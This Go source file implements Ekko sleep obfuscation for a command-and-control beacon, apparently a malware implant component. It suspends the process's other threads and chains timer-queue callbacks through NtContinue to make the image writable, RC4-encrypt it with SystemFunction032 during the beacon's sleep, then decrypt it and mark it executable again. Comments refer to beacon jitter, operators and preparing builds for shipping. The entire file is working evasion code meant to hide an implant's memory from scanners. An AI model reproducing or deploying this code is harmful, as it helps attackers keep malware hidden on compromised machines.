package ekko

import (
	"crypto/rand"
	"errors"
	"fmt"
	"log"
	"runtime"
	"sync/atomic"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	WT_EXECUTEINTIMERTHREAD         = 0x00000020
	ThreadQuerySetWin32StartAddress = 0x9

	// Just what we need: suspend/resume + query for the start-address check.
	threadAccess = windows.THREAD_SUSPEND_RESUME | windows.THREAD_QUERY_INFORMATION | windows.THREAD_GET_CONTEXT

	// CONTEXT_CONTROL on amd64. GetThreadContext after SuspendThread forces
	// the kernel to actually commit the suspension before we touch memory.
	contextControlAMD64 = 0x00100001

	// Grace period (ms) added on top of the intended sleepTime before we
	// assume the Ekko ROP chain has hung and unblock ourselves. sleepTime
	// already includes beacon jitter (beacon.Duration() = Interval + rand
	// Jitter, and the caller passes time.Until(nextCheckin)). This grace is
	// pure overhead: ~600 ms of timer-queue scheduling plus the handful of
	// VirtualProtect / SystemFunction032 calls in the chain. 5 seconds is
	// plenty on any realistic host and doesn't meaningfully change beacon
	// timing under normal conditions.
	ekkoWaitGraceMs = 5000

	// ekkoDebug enables OutputDebugStringA probes at every major transition
	// in EkkoSleep and ekko(). When true, run DebugView on the target and
	// filter by "[ekko" to see a live trace of cycles. Strings are compiled
	// in even when this is false — set to false and rebuild before shipping.
	ekkoDebug = true

	// Upper bound on how many times we call ResumeThread per TID when
	// draining a possibly-elevated suspend count (e.g. a race with Go's
	// sysmon async-preemption). Windows caps a thread's suspend count at
	// MAXIMUM_SUSPEND_COUNT = 0x7F; 32 iterations is more than we should
	// ever need and prevents a runaway API from spinning here forever.
	maxResumeDrain = 32
)

var (
	// kernel32
	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
	procSuspendThread         = kernel32dll.NewProc("SuspendThread")
	procResumeThread          = kernel32dll.NewProc("ResumeThread")
	procGetThreadContext      = kernel32dll.NewProc("GetThreadContext")
	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
	procRtlCaptureContext     = kernel32dll.NewProc("RtlCaptureContext")
	procVirtualProtect        = kernel32dll.NewProc("VirtualProtect")
	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
	procSetEvent              = kernel32dll.NewProc("SetEvent")
	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")
	procDeleteTimerQueueEx    = kernel32dll.NewProc("DeleteTimerQueueEx")
	procOutputDebugStringA    = kernel32dll.NewProc("OutputDebugStringA")

	//ntdll
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtContinue               = ntdll.NewProc("NtContinue")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	//Advapi32
	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
)

// ErrEkkoTimeout is returned when the ROP chain did not signal completion
// within sleepTime + ekkoWaitGraceMs. The threads suspended by EkkoSleep
// are still resumed in this case, so the beacon can continue running, but
// this sleep cycle did not apply memory obfuscation.
var ErrEkkoTimeout = errors.New("ekko: ROP chain did not complete within grace period")

// Cumulative counters exposed via Stats() so operators can detect a host on
// which Ekko is systematically failing and decide (through their existing
// beacon telemetry / control plane) whether to disable sleep obfuscation.
// We deliberately do NOT auto-fall-back to time.Sleep here: that would be a
// visible behaviour change and belongs to a human decision, not a heuristic.
var (
	ekkoSuccesses atomic.Uint64
	ekkoTimeouts  atomic.Uint64
	ekkoCycles    atomic.Uint64 // Total EkkoSleep invocations (for correlating debug probes)
)

// Stats returns cumulative Ekko counters since process start.
//   cycles    = total EkkoSleep invocations
//   successes = cycles where the ROP chain signalled hEvent before timeout
//   timeouts  = cycles where the bounded wait fell through to recovery
func Stats() (cycles, successes, timeouts uint64) {
	return ekkoCycles.Load(), ekkoSuccesses.Load(), ekkoTimeouts.Load()
}

// dbg emits a single line via OutputDebugStringA when ekkoDebug is true.
// The Windows kernel drops the call silently if no debugger is attached,
// so this is cheap in normal operation — but the format strings ARE in the
// binary's data section, so gate at compile time (ekkoDebug=false) before
// shipping.
func dbg(format string, args ...any) {
	if !ekkoDebug {
		return
	}
	msg := fmt.Sprintf("[ekko] "+format+"\n", args...)
	p, err := windows.BytePtrFromString(msg)
	if err != nil {
		return
	}
	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(p)))
	runtime.KeepAlive(p)
}

func EkkoSleep(sleepTime uint64) error {

	// Pin the goroutine to the current OS thread for the entire duration of
	// the sleep. Without this, the Go scheduler can migrate the goroutine to
	// a different M between iterations of the suspend loop, causing
	// GetCurrentThreadId() to return a stale TID and — on the next iteration
	// — we call SuspendThread on the very thread we are currently running on.
	// That is exactly the hang scenario we saw in Process Hacker: one thread
	// suspended, stack frozen inside NtSuspendThread, inside EkkoSleep.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	cycle := ekkoCycles.Add(1)
	dbg("cycle=%d enter EkkoSleep sleepMs=%d", cycle, sleepTime)

	currentProcessID := uint32(windows.GetCurrentProcessId())
	currentTID := windows.GetCurrentThreadId()

	// Take a snapshot of all running threads in the system
	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThreadSnapshot)

	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// Retrieve information about the first thread in the snapshot
	err = windows.Thread32First(hThreadSnapshot, &te32)
	if err != nil {
		return err
	}

	// Track threads we actually suspended so the resume pass touches exactly
	// the same set (in case threads exit between suspend and resume, which
	// would otherwise cause OpenThread to fail mid-resume).
	suspendedTIDs := make([]uint32, 0, 64)

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
	ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)

	for {
		if te32.OwnerProcessID == currentProcessID && te32.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(threadAccess, false, te32.ThreadID)
			if openErr == nil {
				var dwStartAddress, size uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					ThreadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&dwStartAddress)),
					unsafe.Sizeof(dwStartAddress),
					uintptr(unsafe.Pointer(&size)),
				)

				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
					if r, _, _ := procSuspendThread.Call(uintptr(hThread)); r != ^uintptr(0) {
						// SuspendThread is asynchronous; GetThreadContext forces the
						// suspend to commit before we proceed to mutate memory.
						var ctx CONTEXT
						ctx.ContextFlags = contextControlAMD64
						procGetThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)))
						suspendedTIDs = append(suspendedTIDs, te32.ThreadID)
					}
				}
				windows.CloseHandle(hThread)
			}
		}

		// ALWAYS advance — never `continue` without advancing, or we infinite-loop.
		if err = windows.Thread32Next(hThreadSnapshot, &te32); err != nil {
			break // No more threads
		}
	}


	dbg("cycle=%d suspend loop done, suspendedTIDs=%d", cycle, len(suspendedTIDs))

	ekkoErr := ekko(sleepTime)
	switch {
	case errors.Is(ekkoErr, ErrEkkoTimeout):
		ekkoTimeouts.Add(1)
		dbg("cycle=%d ekko() TIMED OUT", cycle)
	case ekkoErr == nil:
		ekkoSuccesses.Add(1)
		dbg("cycle=%d ekko() ok", cycle)
	default:
		dbg("cycle=%d ekko() err=%v", cycle, ekkoErr)
	}

	dbg("cycle=%d entering resume loop", cycle)

	// Resume exactly the threads we suspended. Iterate the captured TID list
	// rather than re-walking the snapshot, so a single OpenThread failure
	// (e.g. a thread exited during the sleep) cannot prevent the remaining
	// suspended threads from being resumed.
	//
	// Drain the suspend count in a loop, not with a single ResumeThread. Go's
	// sysmon does async preemption on Windows by SuspendThread + patch RIP +
	// ResumeThread, and if that interleaves with our own SuspendThread on the
	// same M the counter can end up above 1. Then a single ResumeThread only
	// decrements it to 1 and the M stays suspended forever — an accumulation
	// bug that we could not reproduce with pen-and-paper interleaving but
	// which the dumps show clearly (some Ms end up permanently Suspended with
	// zero recorded CPU time, i.e. suspended before ever running an
	// instruction). ResumeThread returns the PREVIOUS suspend count and
	// stops decrementing at 0, so looping while `previous > 1` is safe.
	resumeFailures := 0
	drainedTotal := uint32(0)
	for _, tid := range suspendedTIDs {
		hThread, openErr := windows.OpenThread(threadAccess, false, tid)
		if openErr != nil {
			// Thread is gone; nothing left to resume for this TID. Keep going.
			resumeFailures++
			continue
		}
		var drains uint32
		for drains = 0; drains < maxResumeDrain; drains++ {
			r, _, _ := procResumeThread.Call(uintptr(hThread))
			// r is the previous suspend count. -1 (DWORD) is error;
			// 0 means it wasn't suspended (nothing to do); 1 means
			// it's now fully resumed; >1 means keep draining.
			if r == 0 || r == 1 || r == ^uintptr(0) {
				break
			}
		}
		if drains > 1 {
			dbg("cycle=%d TID=%d drained %d extra resumes", cycle, tid, drains-1)
			drainedTotal += drains - 1
		}
		windows.CloseHandle(hThread)
	}

	dbg("cycle=%d resume complete, openFailures=%d extraDrains=%d", cycle, resumeFailures, drainedTotal)

	return ekkoErr
}

func ekko(sleepTime uint64) error {

	var CtxThread CONTEXT
	var RopProtRW CONTEXT
	var RopMemEnc CONTEXT
	var RopDelay CONTEXT
	var RopMemDec CONTEXT
	var RopProtRX CONTEXT
	var RopSetEvt CONTEXT

	var keybuf [16]byte
        rand.Read(keybuf[:])

	var Key, Img UString

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))

	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	var hNewTimer, hTimerQueue uintptr
	hTimerQueue, _, _ = procCreateTimerQueue.Call()

	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
	Img.Length = nt_header.OptionalHeader.SizeOfImage

	Key.Buffer = &keybuf[0]
	Key.Length = uint32(unsafe.Sizeof(Key))

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)

	dbg("ekko() CtxThread.Rip=0x%x", CtxThread.Rip)
	if CtxThread.Rip == 0 {
		log.Fatalln()
	}
	RopProtRW = CtxThread
	RopMemEnc = CtxThread
	RopDelay = CtxThread
	RopMemDec = CtxThread
	RopProtRX = CtxThread
	RopSetEvt = CtxThread

	var OldProtect uint64
	RopProtRW.Rsp -= 8
	RopProtRW.Rip = uint64(procVirtualProtect.Addr())
	RopProtRW.Rcx = uint64(ImageBase)
	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRW.R8 = windows.PAGE_READWRITE
	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	RopMemEnc.Rsp -= 8
	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	RopDelay.Rsp -= 8
	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
	RopDelay.Rcx = uint64(windows.CurrentProcess())
	RopDelay.Rdx = sleepTime

	RopMemDec.Rsp -= 8
	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	RopProtRX.Rsp -= 8
	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
	RopProtRX.Rcx = uint64(ImageBase)
	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	// SetEvent( hEvent );
	RopSetEvt.Rsp -= 8
	RopSetEvt.Rip = uint64(procSetEvent.Addr())
	RopSetEvt.Rcx = uint64(hEvent)

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)

	// Bounded wait: without this, a broken ROP chain (which we have observed
	// in practice — the NtContinue-hijacked timer thread occasionally fails
	// to schedule subsequent callbacks) leaves the beacon hung forever in
	// WaitForSingleObject(hEvent, INFINITE) with peer threads still suspended.
	waitTimeout := sleepTime + ekkoWaitGraceMs
	if waitTimeout > 0xFFFFFFFE {
		waitTimeout = 0xFFFFFFFE // clamp: never accidentally pass INFINITE
	}
	dbg("ekko() bounded wait timeoutMs=%d", waitTimeout)
	waitResult, _ := windows.WaitForSingleObject(windows.Handle(hEvent), uint32(waitTimeout))
	dbg("ekko() bounded wait returned result=0x%x", waitResult)

	if waitResult != windows.WAIT_OBJECT_0 {
		// Timed out (or waited on an abandoned/failed event). Drain the queue
		// SYNCHRONOUSLY before returning: DeleteTimerQueueEx with
		// INVALID_HANDLE_VALUE blocks until any in-flight callbacks finish,
		// so no NtContinue can fire on a thread-pool worker after we've
		// returned and started resuming threads / mutating memory. Plain
		// DeleteTimerQueue would NOT wait, which is why we don't reuse it here.
		//
		// KNOWN RISK: if the callback thread has been hijacked by NtContinue
		// and never signals completion to the pool, DeleteTimerQueueEx(...,
		// INVALID_HANDLE_VALUE) can itself block indefinitely. The probes
		// around this call exist so we can see, from DebugView, whether that
		// happens in practice.
		dbg("ekko() recovery: entering DeleteTimerQueueEx")
		procDeleteTimerQueueEx.Call(hTimerQueue, ^uintptr(0))
		dbg("ekko() recovery: DeleteTimerQueueEx returned")

		// Force .text back to executable in case the chain got as far as
		// RopProtRW / RopMemEnc but not RopProtRX / RopMemDec. Restoring to
		// PAGE_EXECUTE_READWRITE matches the state a successful chain leaves
		// behind (RopProtRX uses the same protection), so returning from
		// EkkoSleep will not fault on the next instruction fetch. If the
		// image is still encrypted the beacon will crash anyway — but that
		// is a strictly better failure mode than a permanent hang.
		var oldProt uint32
		procVirtualProtect.Call(
			ImageBase,
			uintptr(nt_header.OptionalHeader.SizeOfImage),
			uintptr(windows.PAGE_EXECUTE_READWRITE),
			uintptr(unsafe.Pointer(&oldProt)),
		)
		dbg("ekko() recovery: VirtualProtect returned oldProt=0x%x", oldProt)
		return ErrEkkoTimeout
	}

	procDeleteTimerQueue.Call(hTimerQueue)
	return nil
}
